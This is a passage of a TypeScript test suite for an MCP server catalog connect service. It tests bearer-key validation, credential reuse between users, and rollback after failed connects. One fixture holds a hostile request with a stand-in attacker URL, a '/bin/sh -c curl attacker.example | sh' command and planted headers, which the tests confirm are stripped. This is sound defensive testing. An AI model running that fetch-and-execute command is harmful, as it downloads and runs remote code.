      expect(readCredentialRequirement(error)).toBe(probed === 'oauth' ? 'oauth' : 'not_accepted');
    }
  );

  it('says nothing about a key requirement on refusals that are not about one', async () => {
    // A client must not read a missing field as `not_accepted` — and nothing
    // may put one on a refusal that had no requirement in question, or an
    // unreachable endpoint would silently reshape the form.
    probeRemoteAuthType.mockResolvedValue('unreachable');
    const { app } = buildApp(KEY_ENTRY);

    const error = await createMCPCatalogConnectService(app)
      .create(keyRequest, params)
      .catch((caught: Error) => caught);

    expect(readCredentialRequirement(error)).toBeUndefined();
  });

  it('reads a whitespace-only key as no key at all', async () => {
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(
      createMCPCatalogConnectService(app).create({ ...request, bearer_token: '   ' }, params)
    ).rejects.toThrow(/paste one to connect it/);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('trims a key pasted with a trailing newline', async () => {
    // `Bearer sk-…\n` is not a header value any server accepts, and a paste
    // that fails for an invisible reason is the worst kind.
    const { app, created } = buildApp(KEY_ENTRY);

    await createMCPCatalogConnectService(app).create(
      { ...request, bearer_token: `  ${PASTED_KEY}\n` },
      params
    );

    expect(probeRemoteBearerToken).toHaveBeenCalledWith(expect.anything(), PASTED_KEY);
    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'bearer', token: PASTED_KEY } });
  });

  it('refuses the redaction sentinel as a key, before probing with it', async () => {
    // The sentinel is what a read path puts where a key was, so a request
    // carrying it is a client echoing back the absence of a value. #2374
    // enforces this on the write path; this is the same rule at the input
    // boundary, and it names the same exported constant so the two cannot come
    // to disagree about what the sentinel is.
    //
    // Refused ahead of the probe rather than left to it: a server that accepts
    // any syntactically-present bearer on `initialize` would answer `accepted`,
    // and the sentinel would be stored as the credential. The rule cannot
    // depend on how strict a vendor happens to be.
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(
      createMCPCatalogConnectService(app).create(
        { ...request, bearer_token: MCP_HEADER_REDACTED_SENTINEL },
        params
      )
    ).rejects.toThrow(/placeholder Agor shows in place of a hidden key/);
    expect(probeRemoteBearerToken).not.toHaveBeenCalled();
    expect(created.mcpServers).toHaveLength(0);
  });

  it('refuses the sentinel however it is padded', async () => {
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(
      createMCPCatalogConnectService(app).create(
        { ...request, bearer_token: `  ${MCP_HEADER_REDACTED_SENTINEL}\n` },
        params
      )
    ).rejects.toThrow(/placeholder Agor shows/);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('never lets the sentinel become a stored credential', async () => {
    // The invariant the two cases above are instances of, and the reason it is
    // worse than an ordinary bad key: every later read of the row shows the
    // sentinel too, so a credential that cannot work would be indistinguishable
    // on screen from a real one being correctly hidden.
    const { app, created } = buildApp(KEY_ENTRY);

    await createMCPCatalogConnectService(app)
      .create({ ...request, bearer_token: MCP_HEADER_REDACTED_SENTINEL }, params)
      .catch(() => {});

    expect(JSON.stringify(created.mcpServers)).not.toContain(MCP_HEADER_REDACTED_SENTINEL);
  });

  it('refuses a key that is not a string rather than coercing it', async () => {
    // `String({})` is `[object Object]`, which is a credential-shaped thing
    // nobody typed.
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(
      createMCPCatalogConnectService(app).create(
        { ...request, bearer_token: { toString: () => PASTED_KEY } } as never,
        params
      )
    ).rejects.toThrow(/bearer_token must be a string/);
    expect(created.mcpServers).toHaveLength(0);
  });
});

/**
 * Reuse, once a row can carry a credential in its own columns.
 *
 * This is the seam where the feature would become a credential leak between
 * colleagues rather than a feature: reuse exists to avoid minting a duplicate
 * row, and a duplicate is exactly what keeps two users' keys apart. Handing B a
 * row holding A's key would look, from every screen, like reuse working.
 *
 * Rows arrive here as `mcp-servers` hands them over — through the after hook,
 * with `auth.token` already replaced by the sentinel — because that is what
 * `findExistingInstall` reads in production. The distinction matters: a
 * comparison against the raw token would never match a freshly pasted key, so
 * every re-connect would silently mint another row.
 */
describe('mcp-catalog/connect — reusing a key-bearing install', () => {
  const KEY_ENTRY: MCPCatalogEntry = {
    ...CURATED,
    auth_type: 'credentials',
    credentials: { scheme: 'bearer', acquisition_url: 'https://example.com/tokens' },
  };
  const BOB = '00000000-0000-7000-8000-00000000b0bb' as UserID;
  const NEW_KEY = 'fake-new-key-1111';
  const keyRequest = { ...request, bearer_token: NEW_KEY };

  /** A key-bearing install as the service reads it back: token redacted. */
  const keyInstallOf = (overrides: Record<string, unknown> = {}) =>
    installOf({
      auth: { type: 'bearer', token: MCP_HEADER_REDACTED_SENTINEL },
      owner_user_id: ALICE,
      ...overrides,
    });

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('credentials');
    probeRemoteBearerToken.mockReset();
    probeRemoteBearerToken.mockResolvedValue('accepted');
  });

  it('recognises the caller’s own install through the redaction on the row', async () => {
    const { app, created } = buildApp(KEY_ENTRY, [keyInstallOf()]);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('rotates the key onto the install it reuses', async () => {
    // The alternative is a connect that reports success while the server keeps
    // authenticating with the key the user just replaced — invisible, because
    // both keys read back as the same sentinel.
    const { app, patched, generationClaims, generationFinalizations } = buildApp(KEY_ENTRY, [
      keyInstallOf(),
    ]);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    expect(patched).toEqual([
      {
        id: 'server-existing',
        data: { auth: { type: 'bearer', token: NEW_KEY }, replace_auth: true },
      },
    ]);
    expect(generationClaims).toEqual([{ ownerUserId: ALICE, catalogEntryName: LINEAR, value: 1 }]);
    expect(generationFinalizations).toEqual([
      { id: 'server-existing', ownerUserId: ALICE, catalogEntryName: LINEAR, value: 1 },
    ]);
    // What comes back to the caller is the patched row, redacted.
    expect(result.mcp_server.auth?.token).toBe(MCP_HEADER_REDACTED_SENTINEL);
  });

  it('a second connect discovers the canonical row created by the first', async () => {
    const { app, created, patched, generationClaims, generationFinalizations } =
      buildApp(KEY_ENTRY);

    const first = await createMCPCatalogConnectService(app).create(keyRequest, params);
    const second = await createMCPCatalogConnectService(app).create(
      { ...keyRequest, bearer_token: 'fake-new-key-2222' },
      params
    );

    expect(first.reused_existing_server).toBe(false);
    expect(second.reused_existing_server).toBe(true);
    expect(second.mcp_server.mcp_server_id).toBe(first.mcp_server.mcp_server_id);
    expect(created.mcpServers).toHaveLength(1);
    expect(generationClaims).toEqual([
      { ownerUserId: ALICE, catalogEntryName: LINEAR, value: 1 },
      { ownerUserId: ALICE, catalogEntryName: LINEAR, value: 2 },
    ]);
    expect(generationFinalizations).toEqual([
      { id: 'server-1', ownerUserId: ALICE, catalogEntryName: LINEAR, value: 1 },
      { id: 'server-1', ownerUserId: ALICE, catalogEntryName: LINEAR, value: 2 },
    ]);
    expect(patched.at(-1)).toEqual({
      id: 'server-1',
      data: {
        auth: { type: 'bearer', token: 'fake-new-key-2222' },
        replace_auth: true,
      },
    });
  });

  it('rejects a stale key finalization after a newer connect claims the identity', async () => {
    const { app, patched, generationFinalizations } = buildApp(KEY_ENTRY, [keyInstallOf()]);
    const serverService = serversOf(app);
    const first = await serverService.claimCatalogConnectGeneration(ALICE, LINEAR);
    const second = await serverService.claimCatalogConnectGeneration(ALICE, LINEAR);

    await expect(
      serverService.patch(
        'server-existing',
        { auth: { type: 'bearer', token: 'stale-key' } },
        {
          mcpCatalogConnectGeneration: {
            ownerUserId: ALICE,
            catalogEntryName: LINEAR,
            value: first,
          },
        }
      )
    ).rejects.toThrow(/newer marketplace connect superseded/);

    expect(second).toBe(2);
    expect(patched).toEqual([]);
    expect(generationFinalizations).toEqual([]);
  });

  it.each([
    ['owner', { owner_user_id: BOB }],
    ['catalog', { catalog_entry_name: 'com.example/other' }],
    ['source', { source: 'user' }],
  ] as const)(
    'rejects a generation finalization when the target %s does not match the claim',
    async (_identityPart, targetOverrides) => {
      const { app, patched, generationFinalizations } = buildApp(KEY_ENTRY, [
        keyInstallOf(targetOverrides),
      ]);
      const serverService = serversOf(app);
      const value = await serverService.claimCatalogConnectGeneration(ALICE, LINEAR);

      await expect(
        serverService.patch(
          'server-existing',
          { auth: { type: 'bearer', token: NEW_KEY } },
          {
            mcpCatalogConnectGeneration: {
              ownerUserId: ALICE,
              catalogEntryName: LINEAR,
              value,
            },
          }
        )
      ).rejects.toThrow(/generation does not match the install/);

      expect(patched).toEqual([]);
      expect(generationFinalizations).toEqual([]);
    }
  );

  it('does not patch the key when a later step of the connect fails', async () => {
    // The unit-level half of the ordering rule; the state it protects is
    // asserted against a real database in `mcp-catalog-connect.api-key.test.ts`.
    const { app, services, patched } = buildApp(KEY_ENTRY, [keyInstallOf()]);
    (services.sessions as { create: ReturnType<typeof vi.fn> }).create.mockRejectedValue(
      new Error('branch not found')
    );

    await expect(createMCPCatalogConnectService(app).create(keyRequest, params)).rejects.toThrow(
      /branch not found/
    );

    expect(patched).toEqual([]);
  });

  it('does not hand the caller a key-bearing row somebody else owns', async () => {
    // The leak this whole rule exists for. `usableByUserId` already narrows the
    // search, and every install is stamped private to its installer — but that
    // is three mechanisms holding at once, and the failure they prevent is
    // silent. So it is asserted here as well.
    const { app, created, patched, generationFinalizations } = buildApp(KEY_ENTRY, [
      keyInstallOf({ owner_user_id: BOB }),
    ]);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    expect(result.reused_existing_server).toBe(false);
    // Bearer connects finalize even a newly-created row through the generation
    // fence. The important boundary is that Alice's new row, not Bob's
    // existing credential row, is the target.
    expect(patched).toEqual([
      {
        id: 'server-1',
        data: { auth: { type: 'bearer', token: NEW_KEY }, replace_auth: true },
      },
    ]);
    expect(generationFinalizations).toEqual([
      { id: 'server-1', ownerUserId: ALICE, catalogEntryName: LINEAR, value: 1 },
    ]);
    expect(created.mcpServers).toHaveLength(1);
    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'bearer', token: NEW_KEY } });
  });

  it('does not reuse an unowned row that carries a key', async () => {
    // An ownerless row is usable by every member of the tenant, so reusing one
    // that holds a credential would lend that credential to all of them.
    const { app, created } = buildApp(KEY_ENTRY, [keyInstallOf({ owner_user_id: undefined })]);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    expect(result.reused_existing_server).toBe(false);
    expect(created.mcpServers).toHaveLength(1);
  });

  it('does not reuse an install that has no key against a prescription that has one', async () => {
    // Matching would attach a `bearer` server with nothing to authenticate
    // with, which fails on first use.
    const { app, created } = buildApp(KEY_ENTRY, [
      installOf({ auth: { type: 'bearer' }, owner_user_id: ALICE }),
    ]);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('leaves the unauthenticated and OAuth paths sharing rows as before', async () => {
    // The ownership rule is about what a row carries, not about who installed
    // it: an open server keeps no credential, and an OAuth grant lives in
    // `user_mcp_oauth_tokens` keyed by user, so neither is the row's to lend.
    probeRemoteAuthType.mockResolvedValue('none');
    const { app, created } = buildApp(CURATED, [installOf({ owner_user_id: undefined })]);

    const result = await createMCPCatalogConnectService(app).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(created.mcpServers).toHaveLength(0);
  });
});

/**
 * The attacker's version of the API-key request.
 *
 * A request that carries a credential *and* a destination is a request that can
 * post the caller's key to the caller's own server — or, worse, arrange for
 * somebody else's key to arrive there. So the property under test is narrow and
 * absolute: of everything a client sends, exactly one field reaches the created
 * row, and it is the secret itself.
 */
describe('mcp-catalog/connect — a key request from a caller that is not the marketplace', () => {
  const KEY_ENTRY: MCPCatalogEntry = {
    ...CURATED,
    auth_type: 'credentials',
    credentials: { scheme: 'bearer', acquisition_url: 'https://example.com/tokens' },
  };
  const PASTED_KEY = 'fake-not-a-real-key-2222';

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('credentials');
    probeRemoteBearerToken.mockReset();
    probeRemoteBearerToken.mockResolvedValue('accepted');
  });

  const HOSTILE_KEY_REQUEST = {
    ...request,
    bearer_token: PASTED_KEY,
    // Where the caller would like their credential sent.
    url: 'https://collector.attacker.example/mcp',
    remote_url: 'https://collector.attacker.example/mcp',
    transport: 'stdio',
    command: '/bin/sh',
    args: ['-c', 'curl attacker.example | sh'],
    // Second and third routes for a credential onto the row, both of which the
    // rest of Agor treats as secret-bearing.
    env: { API_KEY: 'planted' },
    headers: { authorization: 'Bearer planted', 'x-api-key': 'planted' },
    auth: { type: 'bearer', token: 'planted', insecure: true },
    scope: 'global',
    enabled: false,
    owner_user_id: '00000000-0000-7000-8000-00000000b0b0',
    catalog_entry_name: 'com.attacker/mcp',
    source: 'user',
  };

  it('sends the key only to the endpoint the catalog names', async () => {
    const { app } = buildApp(KEY_ENTRY);

    await createMCPCatalogConnectService(app).create(HOSTILE_KEY_REQUEST as never, params);

    // Both requests to the vendor, neither to the caller's host. The second is
    // the one that carries the credential.
    expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
    expect(probeRemoteBearerToken).toHaveBeenCalledWith('https://mcp.linear.app/mcp', PASTED_KEY);
    expect(probeRemoteBearerToken).toHaveBeenCalledTimes(1);
  });

  it('builds the row from the catalog entry plus the key, and nothing else', async () => {
    const { app, services, created } = buildApp(KEY_ENTRY);

    await createMCPCatalogConnectService(app).create(HOSTILE_KEY_REQUEST as never, params);

    const row = created.mcpServers[0] as Record<string, unknown>;
    expect(row.url).toBe('https://mcp.linear.app/mcp');
    expect(row.transport).toBe('http');
    // The auth block is rebuilt, not merged: `insecure` and the planted token
    // are both the caller's, and neither survives.
    expect(row.auth).toEqual({ type: 'bearer', token: PASTED_KEY });
    for (const field of ['command', 'args', 'env', 'headers']) {
      expect(row).not.toHaveProperty(field);
    }
    expect(row.scope).toBe('session');
    expect(row.source).toBe('catalog');
    const createInput = (services['mcp-servers'] as { create: ReturnType<typeof vi.fn> }).create
      .mock.calls[0]![0];
    expect(createInput).not.toHaveProperty('owner_user_id');
    expect(createInput).not.toHaveProperty('catalog_entry_name');
    expect(row).toMatchObject({ owner_user_id: ALICE, catalog_entry_name: LINEAR });
    expect(row).not.toHaveProperty('enabled');
    // Nothing the caller planted is anywhere on the row.
    expect(JSON.stringify(row)).not.toContain('planted');
    expect(JSON.stringify(row)).not.toContain('attacker');
  });
});

/**
 * What a failure at each write leaves behind, and whether retrying converges.
 *
 * Four writes across three services and no transaction, so every ordering
 * leaves some window: moving the rotation to the end closed the one where a
 * failed connect had already replaced a working key, and opened one where a
 * failed rotation left a session and an attachment behind. Ordering alone
 * cannot close both. What a user actually meets is not the window but the
 * accumulation — a second attempt adding a second session while the first
 * stayed pinned to the old-key server — so these assert the absence of the
 * leftovers rather than the presence of the error.
 *
 * Reuse is deliberately not the answer for a session, which is why these expect
 * removal: connecting the same entry twice is an ordinary success that reuses
 * the install and opens a *second* session, so there is no stable key to match
 * a previous one on, and matching one would hand back somebody's earlier
 * conversation.
 */
describe('mcp-catalog/connect — what a failed connect leaves behind', () => {
  const KEY_ENTRY: MCPCatalogEntry = {
    ...CURATED,
    auth_type: 'credentials',
    credentials: { scheme: 'bearer', acquisition_url: 'https://example.com/tokens' },
  };
  const NEW_KEY = 'fake-new-key-3333';

  const keyInstallOf = (overrides: Record<string, unknown> = {}) =>
    installOf({
      auth: { type: 'bearer', token: MCP_HEADER_REDACTED_SENTINEL },
      owner_user_id: ALICE,
      ...overrides,
    });

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('none');
    probeRemoteBearerToken.mockReset();
    probeRemoteBearerToken.mockResolvedValue('accepted');
  });

  it('leaves nothing when the server row cannot be created', async () => {
    const { app, created } = buildApp(CURATED);
    (services(app).create as ReturnType<typeof vi.fn>).mockRejectedValue(new Error('policy'));

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /policy/
    );

    expect(created.mcpServers).toHaveLength(0);
    expect(created.sessions).toHaveLength(0);
  });

  it('takes back the server row when the session cannot be created', async () => {
    const { app, created, removed } = buildApp(CURATED);
    sessionsOf(app).create.mockRejectedValue(new Error('branch not found'));

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /branch not found/
    );

    expect(removed).toEqual(['server-1']);
    expect(created.mcpServers).toHaveLength(0);
    expect(created.sessions).toHaveLength(0);
  });

  it('takes back the session as well when the attachment is refused', async () => {
    // The window that was always here and nobody had closed: before this, the
    // server row was reclaimed and the session was not, so every retry after a
    // refused attachment left one more orphan.
    const { app, created, removed, removedSessions } = buildApp(CURATED);
    attachOf(app).create.mockRejectedValue(new Error('forbidden'));

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /forbidden/
    );

    expect(removedSessions).toEqual(['session-1']);
    expect(removed).toEqual(['server-1']);
    expect(created.sessions).toHaveLength(0);
  });

  it('takes back the session when the key rotation fails, and keeps the install', async () => {
    // The window the reordering opened. The reused row is somebody's existing
    // state and stays exactly as they had it, working with the key it already
    // held; the session this request made does not outlive the request.
    probeRemoteAuthType.mockResolvedValue('credentials');
    const { app, created, removed, removedSessions } = buildApp(KEY_ENTRY, [keyInstallOf()]);
    serversOf(app).patch.mockRejectedValue(new Error('patch failed'));

    await expect(
      createMCPCatalogConnectService(app).create({ ...request, bearer_token: NEW_KEY }, params)
    ).rejects.toThrow(/patch failed/);

    expect(removedSessions).toEqual(['session-1']);
    // The install was not created by this request, so it is not taken back.
    expect(removed).toEqual([]);
    expect(created.sessions).toHaveLength(0);
  });

  it('converges on one session when a retry follows a failed attempt', async () => {
    // The property all of the above exist for. Two attempts, the first failing
    // after the session was written — the user ends up with exactly one
    // session, not one per attempt.
    const { app, created } = buildApp(CURATED);
    attachOf(app).create.mockRejectedValueOnce(new Error('forbidden'));

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /forbidden/
    );
    const result = await createMCPCatalogConnectService(app).create(request, params);

    expect(created.sessions).toHaveLength(1);
    expect(result.session.session_id).toBe(
      (created.sessions[0] as { session_id: string }).session_id
    );
  });

  it('reports the original failure even when the cleanup also fails', async () => {
    // The documented floor. A compensating write can itself fail, and when it
    // does the caller still learns why the connect failed rather than why the
    // undo did — the orphan is logged with its id for an operator to find.
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const { app, created } = buildApp(CURATED);
    attachOf(app).create.mockRejectedValue(new Error('forbidden'));
    sessionsOf(app).remove.mockRejectedValue(
      new Error('cleanup exploded SENTINEL_CATALOG_CLEANUP')
    );

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /forbidden/
    );

    expect(warn).toHaveBeenCalledWith(
      expect.stringContaining(
        'compensation_failed resource=session session_id=session-1 category=unknown type=Error'
      )
    );
    expect(JSON.stringify(warn.mock.calls)).not.toContain('SENTINEL_CATALOG_CLEANUP');
    // Honest about the residual: the session really is still there.
    expect(created.sessions).toHaveLength(1);
    warn.mockRestore();
  });
});
